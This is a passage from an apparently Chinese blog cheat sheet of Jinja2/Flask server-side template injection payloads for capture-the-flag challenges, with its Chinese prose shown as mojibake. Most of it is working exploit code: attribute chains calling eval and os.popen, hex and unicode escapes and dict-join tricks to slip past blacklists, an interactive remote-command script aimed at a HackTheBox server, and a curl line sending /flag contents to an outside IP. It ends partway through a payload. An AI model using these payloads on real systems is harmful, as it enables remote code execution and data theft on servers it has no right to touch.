<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ¯”èµ›ç¯å¢ƒä¸­åŒ…å«å›æ˜¾ï¼Œå…¶å®ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¹ˆä¸€ä¸ªæ€è·¯,æŸ¥æ‰¾catch_warningsï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(([]|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)())[169].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) )%&#125;</span><br></pre></td></tr></table></figure>

<p>hgameé‡è§çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[1:]&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>



<p>æŒ¨ä¸ªåå…­è¿›åˆ¶</p>
<p>é™„ä¸Šä¸€ä¸ªè½¬åå…­è¿›åˆ¶çš„å°è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;__globals__&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(h)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a :</span><br><span class="line">    i = <span class="built_in">bytes</span>(i,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    i = binascii.b2a_hex(i)</span><br><span class="line">    i = i.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line">    i = i.replace(i,<span class="string">&quot;\\x&quot;</span>+i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># i = i.replace(i,&quot;\\x&quot;+i)</span></span><br><span class="line">    print(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># print(h)</span></span><br></pre></td></tr></table></figure>



<p>åœ¨åä¸ºæ¯”èµ›ä¸­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span>(<span class="params">msg</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;json&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#123;&#123;&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> msg: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/over&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;over.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/success&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span>():</span></span><br><span class="line">    msg = request.args.get(<span class="string">&quot;msg&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">&#x27;anonymous&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">&quot;Good Job! &quot;</span> + msg + <span class="string">&quot; . But sorry, there isn&#x27;t flag&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">&quot;You look dangerous.....&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"> . But sorry, there isn<span class="string">&#x27;t flag</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x67\x65\x74&quot;</span>)(<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x67\x65\x74&quot;</span>)(<span class="string">&quot;\x65\x76\x61\x6c&quot;</span>)(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x22\x29\x2e\x72\x65\x61\x64\x28\x29&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>



<p>é™¤äº†åå…­è¿›åˆ¶ï¼Œè¿˜æœ‰unicodeå¯ä»¥è¿›è¡Œç»•è¿‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u0067\u0065\u0074&quot;</span>)(<span class="string">&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u0067\u0065\u0074&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-10-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ–°æ€è·¯"><a href="#2-10-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ–°æ€è·¯" class="headerlink" title="2.10 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ–°æ€è·¯"></a>2.10 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ–°æ€è·¯</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span>(<span class="params">poc</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> poc:</span><br><span class="line">        model = <span class="string">&quot;&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](%d)&quot;</span> % <span class="built_in">ord</span>(<span class="built_in">chr</span>)</span><br><span class="line">        payload += model + <span class="string">&#x27;+&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = product(<span class="string">&#x27;__builtins__&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[65].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">payload</span>):</span></span><br><span class="line">    res = re.findall(<span class="string">&quot;\(\d+\)&quot;</span>, payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:<span class="number">-1</span>])), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode(a)</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/7535">æ–‡ç« å‡ºå¤„</a></p>
<h2 id="2-11-è¿‡æ»¤äº†flag"><a href="#2-11-è¿‡æ»¤äº†flag" class="headerlink" title="2.11 è¿‡æ»¤äº†flag"></a>2.11 è¿‡æ»¤äº†flag</h2><p>åå¼¹shellå‡ºå»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(233)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;getattr(__import__(&#39;os&#39;),&#39;system&#39;)(&#39;curl http:&#x2F;&#x2F;123.57.240.205:1234&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;&#39;)&quot;)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a,item=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=  (x|attr(geti))(ch) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|attr(glo)).get(built) %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a,item=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ev=<span class="built_in">dict</span>(ev=a,al=b)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> eev=  (x|attr(geti))(ev) %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> oo=(<span class="built_in">dict</span>(o=a,s=b)|join)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="keyword">or</span>=<span class="built_in">dict</span>(<span class="keyword">or</span>=a,d=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">ord</span>=  (x|attr(geti))(<span class="keyword">or</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cch=  (x|attr(geti))(ch) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> f=<span class="built_in">dict</span>(F=a)|join%&#125;&#123;% <span class="built_in">set</span> m=<span class="built_in">dict</span>(m=a)|join%&#125;&#123;%<span class="built_in">set</span> sin=cch(<span class="built_in">ord</span>(m)-<span class="built_in">ord</span>(f))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> R=<span class="built_in">dict</span>(R=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuoa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(R))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Q=<span class="built_in">dict</span>(Q=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuob=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Q))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> L=<span class="built_in">dict</span>(L=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> dos=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(L))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> arg=(a,a,<span class="built_in">dict</span>(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dos,<span class="built_in">dict</span>(sys=a,tem=b)|join,kuoa,sin,<span class="built_in">dict</span>(who=a,ami=b)|join,sin,kuob)|join()%&#125;&#123;&#123;arg&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123; eev(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%%<span class="number">20</span><span class="built_in">set</span>%<span class="number">20</span>po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> ge=(a,a,<span class="built_in">dict</span>(ge=a,titem=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> di=(a,a,<span class="built_in">dict</span>(di=a,ct=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(ge))(built)%&#125;&#123;%<span class="built_in">set</span> ev=(<span class="built_in">dict</span>(ev=a,al=b)|join)%&#125;&#123;%<span class="built_in">set</span> fun=x|attr(ge)(ev)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> f=(<span class="built_in">dict</span>(fun=a,c=b)|join,a,<span class="built_in">dict</span>(glo=a,bals=b)|join)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> linecache=(<span class="built_in">dict</span>(line=a,cache=b)|join,a,<span class="built_in">dict</span>(glo=a,bals=b)|join)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> oo=(<span class="built_in">dict</span>(o=a,s=b)|join)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="keyword">or</span>=<span class="built_in">dict</span>(<span class="keyword">or</span>=a,d=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">ord</span>=  (x|attr(ge))(<span class="keyword">or</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cch=  (x|attr(ge))(ch) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> f=<span class="built_in">dict</span>(F=a)|join%&#125;&#123;% <span class="built_in">set</span> m=<span class="built_in">dict</span>(m=a)|join%&#125;&#123;%<span class="built_in">set</span> sin=cch(<span class="built_in">ord</span>(m)-<span class="built_in">ord</span>(f))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> R=<span class="built_in">dict</span>(R=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuoa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(R))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Q=<span class="built_in">dict</span>(Q=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuob=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Q))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> L=<span class="built_in">dict</span>(L=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> dd=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(L))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Z=<span class="built_in">dict</span>(Z=a)|join%&#125;&#123;%<span class="built_in">set</span> spa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Z))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> K=<span class="built_in">dict</span>(K=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> xie=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(K))%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> arg=(a,a,<span class="built_in">dict</span>(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dd,<span class="built_in">dict</span>(po=a,pen=b)|join,kuoa,sin,<span class="built_in">dict</span>(env=a)|join,sin,kuob,dd,<span class="built_in">dict</span>(rea=a,d=b)|join,kuoa,kuob)|join()%&#125;</span><br><span class="line">&#123;&#123;fun(arg)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-12-hacktheboxçš„é‡Œé¢"><a href="#2-12-hacktheboxçš„é‡Œé¢" class="headerlink" title="2.12 hacktheboxçš„é‡Œé¢"></a>2.12 hacktheboxçš„é‡Œé¢</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">Server =<span class="string">&quot;http://138.68.182.108:30171/&quot;</span></span><br><span class="line"><span class="keyword">if</span> requests.get(Server).status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span> (<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            exit()</span><br><span class="line">        sess = requests.Session()</span><br><span class="line">        sess.get(Server+<span class="string">&quot;/?name=&#123;%+if+session.update(&#123;request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()&#125;)+==+1+%&#125;&#123;%+endif+%&#125;&amp;se=asdf&amp;os=os&amp;command=&quot;</span>+cmd)</span><br><span class="line">        session = sess.cookies.get_dict()[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">        print(flask_unsign.decode(<span class="built_in">str</span>(session))[<span class="string">&#x27;asdf&#x27;</span>].decode())</span><br></pre></td></tr></table></figure>





<h2 id="å®‰æ’é˜´é—´é¢˜ç›®çš„é€šæ€payload"><a href="#å®‰æ’é˜´é—´é¢˜ç›®çš„é€šæ€payload" class="headerlink" title="å®‰æ’é˜´é—´é¢˜ç›®çš„é€šæ€payload"></a>å®‰æ’é˜´é—´é¢˜ç›®çš„é€šæ€payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># é¦–å…ˆæ„é€ å‡ºæ‰€éœ€çš„æ•°å­—: </span><br><span class="line">&#123;% set zero &#x3D; (self|int) %&#125;    # 0, ä¹Ÿå¯ä»¥ä½¿ç”¨lenghtè¿‡æ»¤å™¨è·å–æ•°å­—</span><br><span class="line">&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1</span><br><span class="line">&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2</span><br><span class="line">&#123;% set four &#x3D; (two*two)|int %&#125;    # 4</span><br><span class="line">&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5</span><br><span class="line">&#123;% set three &#x3D; five-one-one %&#125;    # 3</span><br><span class="line">&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9</span><br><span class="line">&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7</span><br><span class="line"></span><br><span class="line"># æ„é€ å‡ºæ‰€éœ€çš„å„ç§å­—ç¬¦ä¸å­—ç¬¦ä¸²: </span><br><span class="line">&#123;% set space &#x3D; self|string|min %&#125;    # ç©ºæ ¼</span><br><span class="line">&#123;% set point &#x3D; self|float|string|min %&#125;    # .</span><br><span class="line"></span><br><span class="line">&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # å­—ç¬¦ c</span><br><span class="line">&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # ç™¾åˆ†å· %</span><br><span class="line">&#123;% set bfhc &#x3D; bfh~c %&#125;    # è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥</span><br><span class="line">&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # ä½¿ç”¨%cæ„é€ æ–œæ  &#x2F;</span><br><span class="line">&#123;% set yin &#x3D; bfhc%((three~nine)|int) %&#125;    # ä½¿ç”¨%cæ„é€ å¼•å· &#39;</span><br><span class="line">&#123;% set xhx &#x3D; bfhc%((nine~five)|int) %&#125;    # ä½¿ç”¨%cæ„é€ ä¸‹åˆ’çº¿ _</span><br><span class="line">&#123;% set right &#x3D; bfhc%((four~one)|int) %&#125;    # ä½¿ç”¨%cæ„é€ å³æ‹¬å· )</span><br><span class="line">&#123;% set left &#x3D; bfhc%((four~zero)|int) %&#125;    # ä½¿ç”¨%cæ„é€ å·¦æ‹¬å· (</span><br><span class="line"></span><br><span class="line">&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins</span><br><span class="line">&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;    # import</span><br><span class="line">&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;    # popen</span><br><span class="line">&#123;% set so &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;    # os</span><br><span class="line">&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat</span><br><span class="line">&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag</span><br><span class="line">&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval</span><br><span class="line">&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;    # read</span><br><span class="line">&#123;% set bul &#x3D; xhx~xhx~but~xhx~xhx %&#125;    # __builtins__</span><br><span class="line"></span><br><span class="line">&#123;% set ini &#x3D; dict(ini&#x3D;aa,t&#x3D;bb)|join %&#125;    # init</span><br><span class="line">&#123;% set glo &#x3D; dict(glo&#x3D;aa,bals&#x3D;bb)|join %&#125;    # globals</span><br><span class="line">&#123;% set itm &#x3D; dict(ite&#x3D;aa,ms&#x3D;bb)|join %&#125;    # items</span><br><span class="line"></span><br><span class="line"># å°†ä¸Šé¢æ„é€ çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥æ„é€ å‡º __import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read(): </span><br><span class="line">&#123;% set pld &#x3D; xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line"></span><br><span class="line"># ç„¶åå°†ä¸Šé¢æ„é€ çš„å„ç§å˜é‡æ·»åŠ åˆ°SSTIä¸‡èƒ½payloadé‡Œé¢å°±è¡Œäº†: </span><br><span class="line">&#123;% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;    # globals</span><br><span class="line">	&#123;% if f &#x3D;&#x3D; bul %&#125; </span><br><span class="line">		&#123;% for a,b in (v|attr(itm))() %&#125;    # builtins</span><br><span class="line">			&#123;% if a &#x3D;&#x3D; ev %&#125;    # eval</span><br><span class="line">				